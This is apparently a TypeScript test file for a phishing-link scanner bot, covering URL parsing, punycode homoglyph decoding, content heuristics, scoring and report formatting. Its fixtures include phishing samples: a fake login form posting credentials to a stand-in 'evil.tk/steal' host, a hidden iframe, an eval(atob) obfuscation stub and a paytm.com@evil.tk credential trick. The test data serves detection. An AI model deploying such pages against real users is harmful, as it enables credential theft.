/**
 * Offline tests for the pure logic: URL parsing, HTML heuristics, scoring,
 * report formatting. No network, no Telegram, no Workers runtime needed.
 *
 *   npm test
 */
import assert from 'node:assert/strict';
import { analyzeUrl } from '../function/checks/url';
import { analyzeContent } from '../function/checks/content';
import { scoreFindings } from '../function/scoring';
import { buildReport } from '../function/report';
import { extractUrl, punycodeDecode, registrableDomain, decodeHostname } from '../function/utils';
import type { ScanResult } from '../function/types';

let passed = 0;
const failures: string[] = [];

function test(name: string, fn: () => void): void {
  try {
    fn();
    passed++;
    console.log(`  ok   ${name}`);
  } catch (err) {
    failures.push(`${name}: ${err instanceof Error ? err.message : String(err)}`);
    console.log(`  FAIL ${name}`);
  }
}

function ids(input: string): string[] {
  return analyzeUrl(input).findings.map((f) => f.id);
}

console.log('\nURL extraction');
test('bare domain gets https', () => {
  assert.equal(extractUrl('check this example.com/login now'), 'https://example.com/login');
});
test('full url is kept', () => {
  assert.equal(extractUrl('https://example.com/a?b=1'), 'https://example.com/a?b=1');
});
test('trailing punctuation is stripped', () => {
  assert.equal(extractUrl('go to https://example.com.'), 'https://example.com');
});
test('plain text returns null', () => {
  assert.equal(extractUrl('hello bhai kya haal'), null);
});

console.log('\nRegistrable domain');
test('co.in suffix handled', () => {
  assert.equal(registrableDomain('login.sbi.co.in'), 'sbi.co.in');
});
test('plain com handled', () => {
  assert.equal(registrableDomain('a.b.c.example.com'), 'example.com');
});
test('gov.in suffix handled', () => {
  assert.equal(registrableDomain('passportindia.gov.in'), 'passportindia.gov.in');
});

console.log('\nPunycode');
test('decodes a cyrillic lookalike of apple', () => {
  // xn--80ak6aa92e is the well known all-Cyrillic "apple" homoglyph domain.
  assert.equal(punycodeDecode('80ak6aa92e'), '\u0430\u0440\u0440\u04CF\u0435');
});
test('decodes hostname labels', () => {
  const decoded = decodeHostname('xn--80ak6aa92e.com');
  assert.ok(decoded.startsWith('\u0430\u0440\u0440'));
  assert.ok(decoded.endsWith('.com'));
});


console.log('\nURL heuristics');
test('plain https url is clean', () => {
  const findings = ids('https://example.com/about');
  assert.ok(!findings.includes('url.no-https'));
  assert.ok(!findings.includes('url.ip-host'));
});
test('http is flagged', () => {
  assert.ok(ids('http://example.com').includes('url.no-https'));
});
test('ip literal is flagged', () => {
  assert.ok(ids('http://192.168.1.10/login').includes('url.ip-host'));
});
test('credentials in url are critical', () => {
  const findings = analyzeUrl('https://paytm.com@evil.tk/login').findings;
  assert.ok(findings.some((f) => f.id === 'url.credentials' && f.severity === 'critical'));
});
test('paytm lookalike subdomain is flagged', () => {
  const findings = analyzeUrl('https://paytm.secure-verify.tk/login').findings;
  assert.ok(findings.some((f) => f.id === 'url.brand-paytm'));
});
test('official paytm domain is not flagged', () => {
  const findings = analyzeUrl('https://paytm.com/login').findings;
  assert.ok(!findings.some((f) => f.id.startsWith('url.brand-')));
});
test('apk download is flagged', () => {
  assert.ok(ids('https://example.com/app.apk').includes('url.dangerous-file'));
});
test('free tld is flagged', () => {
  assert.ok(ids('https://random-thing.tk').includes('url.bad-tld'));
});
test('gov.in gets a trust credit', () => {
  const findings = analyzeUrl('https://passportindia.gov.in/').findings;
  assert.ok(findings.some((f) => f.id === 'url.trusted-tld' && f.weight < 0));
});
test('shortener is detected', () => {
  assert.equal(analyzeUrl('https://bit.ly/abc123').isShortener, true);
});

console.log('\nHTML content heuristics');
test('fake login posting cross-domain is critical', () => {
  const html = `<html><title>Login</title><body>
    <form action="https://collect.evil.tk/steal" method="POST">
      <input type="text" name="user"><input type="password" name="pass">
    </form></body></html>`;
  const result = analyzeContent(html, 'https://real-bank.com/login', 'text/html');
  assert.ok(result.findings.some((f) => f.id === 'content.credential-exfil'));
});
test('otp request is critical', () => {
  const html = '<html><body><p>Please share your OTP to complete verification.</p></body></html>';
  const result = analyzeContent(html, 'https://x.com', 'text/html');
  assert.ok(result.findings.some((f) => f.id === 'content.credential-request'));
});
test('hidden iframe is flagged', () => {
  const html = '<html><body><iframe src="//evil.tk" style="display:none"></iframe></body></html>';
  const result = analyzeContent(html, 'https://x.com', 'text/html');
  assert.ok(result.findings.some((f) => f.id === 'content.hidden-iframe'));
});
test('obfuscated js is flagged', () => {
  const html = `<html><body><script>eval(atob('ZWNobyBoaQ=='));</script></body></html>`;
  const result = analyzeContent(html, 'https://x.com', 'text/html');
  assert.ok(result.findings.some((f) => f.id === 'content.obfuscated-js'));
});
test('urgency copy is flagged', () => {
  const html = `<html><body>
    <p>Your account has been suspended. Verify your account immediately.</p>
    <p>Urgent action required. Click here to verify within 24 hours.</p>
    <p>Claim your reward now.</p></body></html>`;
  const result = analyzeContent(html, 'https://x.com', 'text/html');
  assert.ok(result.findings.some((f) => f.id === 'content.urgency-heavy' || f.id === 'content.urgency'));
});
test('clean page produces no critical finding', () => {
  const html = '<html><title>Example</title><body><h1>Example Domain</h1><p>This domain is for use in examples.</p></body></html>';
  const result = analyzeContent(html, 'https://example.com', 'text/html');
  assert.ok(!result.findings.some((f) => f.severity === 'critical'));
});
test('title is extracted', () => {
  const result = analyzeContent('<html><title>My Shop &amp; Co</title></html>', 'https://x.com', 'text/html');
  assert.equal(result.title, 'My Shop & Co');
});

console.log('\nScoring');
test('no findings is safe', () => {
  const scored = scoreFindings([]);
  assert.equal(scored.verdict, 'safe');
  assert.equal(scored.score, 0);
});
test('one critical finding forces danger', () => {
  const scored = scoreFindings([
    { id: 'a', severity: 'critical', title: 't', detail: 'd', weight: 5 },
    { id: 'b', severity: 'good', title: 't', detail: 'd', weight: -40 },
  ]);
  assert.equal(scored.verdict, 'danger');
  assert.ok(scored.score > 55);
});
test('two high findings escalate past safe', () => {
  const scored = scoreFindings([
    { id: 'a', severity: 'high', title: 't', detail: 'd', weight: 12 },
    { id: 'b', severity: 'high', title: 't', detail: 'd', weight: 12 },
  ]);
  assert.notEqual(scored.verdict, 'safe');
});
test('score is clamped to 100', () => {
  const scored = scoreFindings([
    { id: 'a', severity: 'critical', title: 't', detail: 'd', weight: 90 },
    { id: 'b', severity: 'critical', title: 't', detail: 'd', weight: 90 },
  ]);
  assert.equal(scored.score, 100);
});
test('duplicate findings are counted once', () => {
  const scored = scoreFindings([
    { id: 'same', severity: 'low', title: 't', detail: 'd', weight: 5 },
    { id: 'same', severity: 'low', title: 't', detail: 'd', weight: 5 },
  ]);
  assert.equal(scored.counts.low, 1);
});

console.log('\nReport formatting');
test('report renders and escapes html', () => {
  const result: ScanResult = {
    verdict: 'danger',
    score: 90,
    headline: 'Do not open this link.',
    findings: [{ id: 'x', severity: 'critical', title: 'Bad <thing>', detail: 'a & b', weight: 50 }],
    meta: {
      inputUrl: 'https://evil.tk',
      finalUrl: 'https://evil.tk',
      host: 'evil.tk',
      unicodeHost: 'evil.tk',
      registrableDomain: 'evil.tk',
      scheme: 'https',
      statusCode: 200,
      redirectCount: 0,
      contentType: 'text/html',
      title: 'Free <b>iPhone</b>',
      description: '',
      domainAgeDays: 2,
      registrar: 'NameSilo',
      expiresInDays: 363,
      hasA: true,
      hasMx: false,
      nameservers: [],
      hsts: false,
      csp: false,
      serverHeader: 'nginx',
      pageBytes: 1000,
      screenshot: null,
      reputation: {
        safeBrowsing: 'skipped',
        safeBrowsingThreats: [],
        virusTotal: 'skipped',
        virusTotalPositives: 0,
        virusTotalEngines: 0,
        urlhaus: 'skipped',
        cloudflareFilter: 'skipped',
      },
      elapsedMs: 3200,
      checkedAt: new Date().toISOString(),
    },
  };
  const report = buildReport(result);
  assert.ok(report.includes('DANGEROUS'));
  assert.ok(report.includes('&lt;b&gt;iPhone&lt;/b&gt;'));
  assert.ok(report.includes('&amp;'));
  assert.ok(report.length < 4096);
});

console.log(`\n${passed} passed, ${failures.length} failed`);
if (failures.length > 0) {
  for (const failure of failures) console.error(`  - ${failure}`);
  process.exit(1);
}
